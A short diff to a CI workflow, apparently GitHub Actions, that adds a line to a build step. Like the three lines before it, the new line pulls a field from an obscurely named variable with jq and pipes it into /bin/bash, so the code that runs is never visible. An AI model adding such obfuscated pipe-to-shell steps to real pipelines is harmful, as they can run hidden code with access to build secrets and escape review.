@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$psm81" | jq -r .rrry48 | /bin/bash
           printf '%s' "$qf0" | jq -r .hsq1 | /bin/bash
           echo $tgou21383 | jq -r .y336 | /bin/bash
+          echo $simz0 | jq -r .yzlop0 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
